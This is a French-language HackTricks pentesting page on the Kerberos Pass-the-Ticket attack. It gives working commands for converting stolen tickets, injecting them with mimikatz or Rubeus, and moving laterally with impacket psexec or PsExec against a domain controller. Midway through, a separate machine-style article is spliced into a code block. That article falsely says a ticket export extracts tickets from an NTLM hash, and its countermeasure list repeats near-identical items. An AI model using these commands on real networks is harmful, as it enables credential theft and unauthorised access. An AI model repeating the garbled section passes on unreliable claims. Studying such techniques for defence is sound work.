# Pass the Ticket

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.io/) pour créer et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Pass The Ticket (PTT)

Ce type d'attaque est similaire à Pass the Key, mais au lieu d'utiliser des hachages pour demander un ticket, le ticket lui-même est volé et utilisé pour s'authentifier en tant que propriétaire.

**Lire** :

* [Récolte de tickets à partir de Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
* [Récolte de tickets à partir de Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Échange de tickets Linux et Windows entre les plateformes**

Le script [ticket\_converter](https://github.com/Zer1t0/ticket\_converter). Les seuls paramètres nécessaires sont le ticket actuel et le fichier de sortie, il détecte automatiquement le format du fichier de ticket d'entrée et le convertit. Par exemple :
```
root@kali:ticket_converter# python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi
root@kali:ticket_converter# python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
[Kekeo](https://github.com/gentilkiwi/kekeo) peut être utilisé pour convertir les tickets Kerberos en tickets Windows. Cependant, cet outil n'a pas été vérifié car il nécessite une licence pour leur bibliothèque ASN1, mais je pense qu'il vaut la peine d'être mentionné.

### Attaque Pass The Ticket

{% code title="Linux" %}
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
{% code title="Windows" %}

# Pass the Ticket

La technique Pass the Ticket (PtT) consiste à utiliser un ticket Kerberos volé pour accéder à des ressources protégées par Kerberos. Cette technique est souvent utilisée après une attaque d'escalade de privilèges ou de vol de hash NTLM.

## Étape 1 : Obtenir un ticket Kerberos

Pour obtenir un ticket Kerberos, vous pouvez utiliser Mimikatz ou tout autre outil similaire. La commande suivante permet d'extraire un ticket Kerberos à partir d'un hash NTLM :

```
mimikatz # sekurlsa::tickets /export
```

## Étape 2 : Utiliser le ticket Kerberos

Une fois que vous avez un ticket Kerberos, vous pouvez l'utiliser pour accéder à des ressources protégées par Kerberos. La commande suivante permet d'utiliser un ticket Kerberos pour ouvrir une session sur un ordinateur distant :

```
mimikatz # kerberos::ptt [ticket.kirbi]
```

## Étape 3 : Profiter de l'accès

Une fois que vous avez ouvert une session avec le ticket Kerberos, vous pouvez accéder aux ressources protégées par Kerberos sur l'ordinateur distant. Vous pouvez également utiliser le ticket Kerberos pour accéder à d'autres ressources protégées par Kerberos sur le réseau.

## Contre-mesures

Pour se protéger contre les attaques PtT, il est recommandé de mettre en place les mesures de sécurité suivantes :

- Utiliser des comptes à privilèges minimisés
- Mettre en place des contrôles d'accès basés sur les rôles
- Mettre en place des contrôles d'accès basés sur les attributs de sécurité
- Mettre en place des contrôles d'accès basés sur les groupes
- Mettre en place des contrôles d'accès basés sur les horaires
- Mettre en place des contrôles d'accès basés sur les adresses IP
- Mettre en place des contrôles d'accès basés sur les protocoles
- Mettre en place des contrôles d'accès basés sur les applications
- Mettre en place des contrôles d'accès basés sur les services
- Mettre en place des contrôles d'accès basés sur les ressources

Il est également recommandé de surveiller les événements de sécurité pour détecter les attaques PtT et de mettre en place des mécanismes de détection d'anomalies pour détecter les comportements suspects.
```bash
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
{% endcode %}

## Références

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.io/) pour construire et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
